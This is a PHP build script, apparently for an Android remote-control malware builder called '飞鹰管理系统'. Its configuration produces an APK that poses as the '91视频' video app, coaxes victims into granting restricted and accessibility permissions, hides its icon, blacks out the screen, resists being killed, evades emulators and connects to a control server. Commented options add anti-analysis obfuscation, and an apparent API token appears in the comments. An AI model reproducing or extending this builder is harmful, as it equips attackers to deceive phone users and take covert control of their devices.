<?php
/**
 * 飞鹰管理系统 - APK 构建脚本 v3
 * 
 * 使用 ApkBuilder.php 进行构建
 * 
 * 用法: php build_apk.php
 */

date_default_timezone_set('Asia/Shanghai');
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once __DIR__ . '/src/private/ApkBuilder.php';

// ============================================
// 配置区域 - 请根据实际情况修改
// ============================================
// $arguments = [
//     'com.icontrol.protector',    // appid
//     '126021',                     // userid
//     'demo',                       // clientname
//     'TTJ2mXy9xnFkYRkjoPGSxg==',  // email (加密后的)
//     'empty',                      // mainActivity (buildtype C 时为 empty)
//     'empty',                      // app_folder (buildtype C 时为 empty)
//     'p4q2.cn',                    // UserHost
//     '1',                          // use_access
//     '1',                          // use_antkill
//     '加载中~请勿操作或锁屏！',      // use_atoprims
//     ' ',                          // notifytitle
//     'on',                         // notifymsg
//     '1',                          // user_allprims
//     '1',                          // user_blackprims
//     'C',                          // buildtype
//     'demo',                       // appname
//     '1.0',                        // appversion
//     '816089f3a4bf1d90742689659cf60f00.png',  // appicopath
//     'http://192.168.31.35',       // appurl
//     'name',                       // logintitle
//     '允许受限制的设置',            // logindis
//     '确定',                       // loginbtn
//     '91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用',  // lngshort
//     '1',                          // hiddenapp
//     'black',                      // noemulator
//     'g',                          // installtype
//     'f',                          // hide_type
//     '0',                          // use_draw
//     '0',                          // open_access
//     '无',                         // descr_iption
//     '1'                           // diao_type
// ];
//不使用背景图参数
// {
//     "email": "TTJ2mXy9xnFkYRkjoPGSxg==",
//     "token": "4006cc15f2a4e980967e4c0c5cfb67ab",
//     "subcom": "build",
//     "btype": "C",
//     "uhost": "p4q2.cn",
//     "cname": "上线名称",
//     "uaccess": "1",
//     "ukill": "1",
//     "uprims": "加载中~请勿操作或锁屏！",
//     "appid": "_com_test",
//     "nottitle": " ",
//     "notmsg": "on",
//     "appname": "应用信息",
//     "appversion": "1.0",
//     "icoid": "816089f3a4bf1d90742689659cf60f00.png",
//     "appurl": "http://localhost/setting/system",
//     "allprims": "1",
//     "blackprims": "1",
//     "logt": "name",
//     "logd": "允许受限制的设置",
//     "logb": "确定",
//     "loglng": "91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用",
//     "hidapp": "1",
//     "noemu": "black",
//     "accsstyp": "g",
//     "hidtype": "f",
//     "usedraw": "0",
//     "openaccess": "0",
//     "description": "无",
//     "diaotype": "1"
// }
//使用背景图参数
// {
//     "email": "TTJ2mXy9xnFkYRkjoPGSxg==",
//     "token": "4006cc15f2a4e980967e4c0c5cfb67ab",
//     "subcom": "build",
//     "btype": "C",
//     "uhost": "p4q2.cn",
//     "cname": "上线名称",
//     "uaccess": "1",
//     "ukill": "1",
//     "uprims": "加载中~请勿操作或锁屏！",
//     "appid": "_com_test",
//     "nottitle": " ",
//     "notmsg": "on",
//     "appname": "应用信息",
//     "appversion": "1.0",
//     "icoid": "816089f3a4bf1d90742689659cf60f00.png",
//     "appurl": "http://localhost/setting/system",
//     "allprims": "1",
//     "blackprims": "1",
//     "logt": "name",
//     "logd": "允许受限制的设置",
//     "logb": "确定",
//     "loglng": "91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用",
//     "hidapp": "1",
//     "noemu": "C:\\xampp\\htdocs\\user\\ui\\y8.png",
//     "accsstyp": "g",
//     "hidtype": "f",
//     "usedraw": "0",
//     "openaccess": "0",
//     "description": "无",
//     "diaotype": "1"
// }

$config = [
    // APK 基本信息
    'appid'          => 'com.icontrol.protector',  // 包名 (不要修改，否则会崩溃)
    'appname'        => '91',                      // 应用名称
    'appversion'     => '1.0',                     // 版本号
    
    // 用户信息
    'userid'         => '991924',                  // 用户 ID
    'clientname'     => 'TestClient',              // 客户端标识
    'email'          => 'test@test.com',        // 用户邮箱 (原始值，ApkBuilder 会加密)
    
    // 服务器配置
    'UserHost'       => '192.168.31.35:8080',      // 服务器域名 (nginx 会代理 WebSocket)
    'appurl'         => 'http://baidu.com', // 完整 URL (用于判断 http/https)
    
    // 功能开关
    'useAccess'      => '1',                       // 无障碍服务
    'useAntkill'     => '1',                       // 防杀进程
    'userAllprims'   => '1',                       // 请求所有权限
    'userBlackprims' => '1',                       // 黑屏遮挡
    'useAtoprims'    => '加载中~请勿操作或锁屏！',  // 自动授权提示
    
    // 界面配置
    'loginTitle'     => '欢迎使用',                // 登录标题
    'loginDis'       => '允许受限制的设置',        // 登录描述
    'loginBtn'       => '开始',                    // 登录按钮文字
    'lngShort'       => '91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用', // 语言/引导文字
    
    // 通知配置
    'notifyTitle'    => ' ',                       // 通知标题 (空格)
    'notifyMsg'      => 'on',                      // 通知内容
    
    // 功能开关 (0=关闭, 1=开启)
    'useDraw'        => '0',                       // 悬浮窗
    'openAccess'     => '0',                       // 自动打开无障碍
    'diaoType'       => '1',                       // 弹窗锁定
    'hiddenApp'      => '1',                       // 隐藏应用
    'noEmulator'     => 'storage/user/ui/y1.png',  // 背景图: 'black'=纯黑色, 或本地文件路径如 '/path/to/image.png'
    'hideType'       => 'f',                       // 隐藏类型
    'installType'    => 'g',                       // 安装引导类型
    'buildType'      => 'C',                       // 构建类型 (C=Custom, S=Store)
    
    // 图标 (需要先上传到 storage/user/storage/{userid}/icons/ 目录)
    'appicopath'     => '33d9a1c82517bc3312f314adc3a40c60.png', // 图标文件名
    
    // 其他
    'mainActivity'   => 'empty',                   // 主 Activity (buildtype C 时为 empty)
    'appFolder'      => 'empty',                   // 应用文件夹 (buildtype C 时为 empty)
    'description'    => '无',                      // 描述
    
    // 保护功能开关（默认关闭，可按需开启）
    // 'enableJunkClasses'    => true,             // 生成垃圾类
    // 'enableClassShuffle'   => true,             // 类名混淆
    // 'enableApkProtection'  => true,             // APK 保护
    // 'enableDexModification'=> true,             // DEX 修改
];

// ============================================
// 辅助函数
// ============================================

function output($msg, $type = 'info') {
    $icons = ['info' => 'ℹ️', 'success' => '✅', 'error' => '❌', 'warning' => '⚠️'];
    echo "[" . date('H:i:s') . "] " . ($icons[$type] ?? '') . " {$msg}\n";
}

// ============================================
// 主构建流程
// ============================================

output("========================================");
output("飞鹰管理系统 - APK 构建脚本 v3");
output("使用 ApkBuilder.php");
output("========================================");
output("应用名称: {$config['appname']}");
output("包名: {$config['appid']}");
output("服务器: {$config['UserHost']}");
output("用户ID: {$config['userid']}");
output("========================================");

// 检查图标文件
$iconPath = __DIR__ . '/storage/user/storage/' . $config['userid'] . '/icons/' . $config['appicopath'];
if (!file_exists($iconPath)) {
    output("图标文件不存在: {$iconPath}", 'warning');
    output("创建默认图标目录...");
    
    $iconDir = dirname($iconPath);
    if (!is_dir($iconDir)) {
        mkdir($iconDir, 0755, true);
    }
    
    // 创建一个简单的默认图标 (1x1 红色像素 PNG)
    $defaultIcon = __DIR__ . '/src/private/apkstub/extracted_apkstub/res/drawable/mylogo.png';
    if (file_exists($defaultIcon)) {
        copy($defaultIcon, $iconPath);
        output("已复制默认图标", 'success');
    } else {
        output("无法创建默认图标，构建可能失败", 'error');
        exit(1);
    }
}

output("开始构建...");

try {
    $builder = new ApkBuilder();
    
    // 使用配置对象构建（推荐方式）
    $buildConfig = \ApkBuilder\ApkBuildConfig::fromArray($config);
    $result = $builder->build($buildConfig);
    
    output("========================================");
    
    if ($result['success']) {
        output("APK 构建成功!", 'success');
        output("输出路径: {$result['path']}", 'success');
        
        // 显示完整路径
        $fullPath = __DIR__ . '/storage' . $result['path'];
        if (file_exists($fullPath)) {
            $size = round(filesize($fullPath) / 1024 / 1024, 2);
            output("完整路径: {$fullPath}", 'info');
            output("文件大小: {$size} MB", 'info');
        }
        
        // 显示构建步骤耗时统计
        if (isset($result['stats'])) {
            output("========================================");
            output("构建耗时统计:");
            output("----------------------------------------");
            
            $stats = $result['stats'];
            if (isset($stats['steps']) && is_array($stats['steps'])) {
                foreach ($stats['steps'] as $step => $timeMs) {
                    $timeFormatted = $timeMs < 1000 
                        ? round($timeMs) . 'ms' 
                        : round($timeMs / 1000, 2) . 's';
                    $stepName = str_pad($step, 25);
                    output("  {$stepName} {$timeFormatted}");
                }
            }
            
            output("----------------------------------------");
            output("  总耗时: {$stats['total_time_formatted']}");
        }
        
        output("========================================");
        output("");
        output("下一步:");
        output("1. 下载 APK: curl -O http://your-server{$result['path']}");
        output("2. 在设备上安装测试");
        output("3. 确保服务器 {$config['UserHost']} 可访问");
    } else {
        output("APK 构建失败!", 'error');
        output("错误: {$result['error']}", 'error');
        exit(1);
    }
    
} catch (Throwable $e) {
    output("构建异常: " . $e->getMessage(), 'error');
    output("堆栈: " . $e->getTraceAsString(), 'error');
    exit(1);
}
